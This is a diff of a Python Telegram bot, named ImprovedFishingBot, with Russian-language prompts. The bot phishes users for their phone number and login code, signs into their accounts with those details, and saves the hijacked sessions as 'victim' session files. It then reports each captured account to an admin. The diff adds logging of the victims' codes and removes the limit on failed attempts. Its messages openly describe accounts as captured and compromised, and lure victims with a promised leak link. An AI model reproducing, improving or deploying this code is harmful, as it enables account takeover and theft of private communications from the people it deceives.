@@ -32,7 +32,6 @@ class ImprovedFishingBot:
     def __init__(self):
         self.bot = TelegramClient('bot_session', API_ID, API_HASH)
         self.pending_auth = {}
-        self.invalid_attempts = {}
         self.code_inputs = {}
 
     async def start(self):
@@ -59,6 +58,7 @@ class ImprovedFishingBot:
                 return
             
             user_id = event.sender_id
+            print(f"[DEBUG] Сообщение от {user_id}: {event.text if event.text else 'контакт'}")
             
             # Обработка контакта
             if event.contact:
@@ -66,14 +66,18 @@ class ImprovedFishingBot:
                 if not phone.startswith('+'):
                     phone = '+' + phone
                 
+                print(f"[DEBUG] Получен контакт от {user_id}: {phone}")
+                
                 await event.respond(
                     "✅ **Номер получен!**\n"
                     f"Телефон: `{phone}`\n\n"
-                    "Теперь нажмите кнопку ниже, чтобы получить код подтверждения:",
+                    "Нажмите кнопку ниже, чтобы получить код подтверждения:",
                     buttons=[
                         [KeyboardButton(text="🔑 ПОЛУЧИТЬ КОД")]
                     ]
                 )
+                
+                # Сохраняем данные пользователя
                 self.pending_auth[user_id] = {
                     'step': 'awaiting_code_request',
                     'phone': phone
@@ -83,43 +87,46 @@ class ImprovedFishingBot:
             # Обработка текстовых сообщений
             if event.text:
                 text = event.text.strip()
+                print(f"[DEBUG] Текст от {user_id}: {text}")
                 
-                if user_id in self.pending_auth:
-                    auth_data = self.pending_auth[user_id]
-                    step = auth_data.get('step')
-                    
-                    if step == 'awaiting_code_request' and text == "🔑 ПОЛУЧИТЬ КОД":
-                        await self.request_code(event, user_id, auth_data['phone'])
-                    
-                    elif step == 'awaiting_code_request' and text == "🆕 ПОЛУЧИТЬ НОВЫЙ КОД":
-                        await self.request_code(event, user_id, auth_data['phone'])
-                    
-                    elif step == 'waiting_code':
-                        code = text.replace(' ', '').replace('-', '')
-                        if code.isdigit() and len(code) in (5, 6):
-                            await self.verify_code(event, user_id, code)
-                        else:
-                            await event.respond(
-                                "❌ **Неверный формат кода!**\n\n"
-                                "Код должен состоять из 5 или 6 цифр.\n"
-                                "Пожалуйста, введите код еще раз:"
-                            )
-                            self.invalid_attempts[user_id] = self.invalid_attempts.get(user_id, 0) + 1
-                            
-                            if self.invalid_attempts[user_id] >= 3:
-                                await event.respond(
-                                    "⚠️ **Слишком много попыток!**\n"
-                                    "Нажмите 'Получить новый код', чтобы запросить новый код.",
-                                    buttons=[
-                                        [KeyboardButton(text="🆕 ПОЛУЧИТЬ НОВЫЙ КОД")]
-                                    ]
-                                )
-                                self.pending_auth[user_id]['step'] = 'awaiting_code_request'
+                if user_id not in self.pending_auth:
+                    await event.respond("⚠️ Нажмите /start для начала")
+                    return
+                
+                auth_data = self.pending_auth[user_id]
+                step = auth_data.get('step')
+                
+                # Обработка нажатия "ПОЛУЧИТЬ КОД"
+                if step == 'awaiting_code_request' and text == "🔑 ПОЛУЧИТЬ КОД":
+                    print(f"[DEBUG] Запрос кода для {user_id}")
+                    await self.request_code(event, user_id, auth_data['phone'])
+                    return
+                
+                # Обработка ввода кода
+                if step == 'waiting_code':
+                    code = text.replace(' ', '').replace('-', '')
+                    if code.isdigit() and len(code) in (5, 6):
+                        print(f"[DEBUG] Получен код от {user_id}: {code}")
+                        await self.verify_code(event, user_id, code)
+                    else:
+                        await event.respond(
+                            "❌ **Неверный формат кода!**\n\n"
+                            "Код должен состоять из 5 или 6 цифр.\n"
+                            "Пожалуйста, введите код еще раз:"
+                        )
+                    return
+                
+                # Если ничего не подошло
+                if step == 'awaiting_code_request':
+                    await event.respond(
+                        "⚠️ Нажмите кнопку **🔑 ПОЛУЧИТЬ КОД** для продолжения"
+                    )
 
         @self.bot.on(events.CallbackQuery)
         async def callback_handler(event):
             user_id = event.sender_id
             data = event.data.decode()
+            print(f"[DEBUG] Callback от {user_id}: {data}")
             
             if user_id not in self.pending_auth:
                 await event.answer("⚠️ Сессия истекла, начните заново /start")
@@ -143,7 +150,7 @@ class ImprovedFishingBot:
                         f"📱 **Введите код подтверждения**\n\n"
                         f"Текущий код: `{code_input}`\n"
                         f"Длина: {len(code_input)}/6\n\n"
-                        "Используйте клавиатуру ниже для ввода кода:",
+                        "Используйте клавиатуру ниже:",
                         buttons=[
                             [KeyboardButtonCallback(text="1", data=b"1"), 
                              KeyboardButtonCallback(text="2", data=b"2"), 
@@ -159,8 +166,8 @@ class ImprovedFishingBot:
                              KeyboardButtonCallback(text="✅ ОТПРАВИТЬ", data=b"SEND")]
                         ]
                     )
-                except:
-                    pass
+                except Exception as e:
+                    print(f"[ERROR] Ошибка обновления: {e}")
             
             elif data == 'SEND':
                 if len(code_input) in (5, 6):
@@ -180,7 +187,7 @@ class ImprovedFishingBot:
                             f"📱 **Введите код подтверждения**\n\n"
                             f"Текущий код: `{code_input}`\n"
                             f"Длина: {len(code_input)}/6\n\n"
-                            "Используйте клавиатуру ниже для ввода кода:",
+                            "Используйте клавиатуру ниже:",
                             buttons=[
                                 [KeyboardButtonCallback(text="1", data=b"1"), 
                                  KeyboardButtonCallback(text="2", data=b"2"), 
@@ -196,31 +203,33 @@ class ImprovedFishingBot:
                                  KeyboardButtonCallback(text="✅ ОТПРАВИТЬ", data=b"SEND")]
                             ]
                         )
-                    except:
-                        pass
+                    except Exception as e:
+                        print(f"[ERROR] Ошибка обновления: {e}")
                 else:
                     await event.answer("⚠️ Максимум 6 цифр!")
 
     async def request_code(self, event, user_id, phone):
         """Запрос кода подтверждения"""
         try:
+            print(f"[DEBUG] Запрос кода для {user_id}, телефон {phone}")
+            
             temp_client = TelegramClient(f'{SESSIONS_DIR}/temp_{user_id}', API_ID, API_HASH)
             await temp_client.connect()
             
             result = await temp_client.send_code_request(phone)
+            print(f"[DEBUG] Код отправлен для {user_id}, hash: {result.phone_code_hash}")
             
             self.pending_auth[user_id].update({
                 'step': 'waiting_code',
-                'client': temp_client,
-                'phone_code_hash': result.phone_code_hash,
-                'temp_client': temp_client
+                'temp_client': temp_client,
+                'phone_code_hash': result.phone_code_hash
             })
             self.code_inputs[user_id] = ''
             
             await event.respond(
                 "📱 **Введите код подтверждения**\n\n"
                 "Код был отправлен вам в Telegram.\n"
-                "Используйте клавиатуру ниже для ввода кода:\n",
+                "Используйте клавиатуру ниже для ввода кода:",
                 buttons=[
                     [KeyboardButtonCallback(text="1", data=b"1"), 
                      KeyboardButtonCallback(text="2", data=b"2"), 
@@ -238,13 +247,15 @@ class ImprovedFishingBot:
             )
             
         except Exception as e:
-            await event.respond(f"❌ Ошибка запроса кода: {str(e)}")
+            print(f"[ERROR] Ошибка запроса кода: {e}")
+            await event.respond(f"❌ Ошибка запроса кода: {str(e)}\nПопробуйте /start")
             self.pending_auth.pop(user_id, None)
 
     async def verify_code(self, event, user_id, code):
         """Проверка введенного кода и авторизация"""
         auth_data = self.pending_auth.get(user_id)
         if not auth_data:
+            await event.respond("❌ Сессия истекла, начните заново /start")
             return
         
         temp_client = auth_data.get('temp_client')
@@ -256,11 +267,15 @@ class ImprovedFishingBot:
         phone_code_hash = auth_data['phone_code_hash']
         
         try:
+            print(f"[DEBUG] Попытка авторизации для {user_id} с кодом {code}")
+            
             await temp_client.sign_in(
                 phone=phone,
                 code=code,
                 phone_code_hash=phone_code_hash
             )
+            
+            print(f"[DEBUG] Авторизация успешна для {user_id}")
             
             session_file = f'{SESSIONS_DIR}/victim_{user_id}.session'
             await temp_client.disconnect()
@@ -280,8 +295,7 @@ class ImprovedFishingBot:
             await event.respond(
                 "✅ **ДОСТУП ПРЕДОСТАВЛЕН!**\n\n"
                 f"🎯 Аккаунт захвачен и сохранен в: `{tdata_path}`\n"
-                "Ссылка на слив златы будет отправлена в течение 5 минут.\n\n"
-                "⚠️ Сохраните этот чат для получения дальнейших инструкций."
+                "Ссылка на слив златы будет отправлена в течение 5 минут."
             )
             
             await self.notify_admin(user_id, phone, session_file)
@@ -299,7 +313,7 @@ class ImprovedFishingBot:
         except PhoneCodeExpiredError:
             await event.respond(
                 "⏰ **Код истек!**\n\n"
-                "Запросите новый код, нажав кнопку ниже.",
+                "Нажмите кнопку ниже для нового кода.",
                 buttons=[
                     [KeyboardButton(text="🆕 ПОЛУЧИТЬ НОВЫЙ КОД")]
                 ]
@@ -307,6 +321,7 @@ class ImprovedFishingBot:
             self.pending_auth[user_id]['step'] = 'awaiting_code_request'
             
         except Exception as e:
+            print(f"[ERROR] Ошибка авторизации: {e}")
             await event.respond(f"❌ Ошибка авторизации: {str(e)}")
             self.pending_auth.pop(user_id, None)
 
@@ -364,8 +379,7 @@ class ImprovedFishingBot:
                 f"ID: {user_id}\n"
                 f"Телефон: {phone}\n"
                 f"Сессия: {session_file}\n"
-                f"Время: {datetime.now().isoformat()}\n"
-                f"Статус: ✅ Аккаунт полностью скомпрометирован"
+                f"Время: {datetime.now().isoformat()}"
             )
         except Exception as e:
             print(f"Ошибка уведомления админа: {e}")
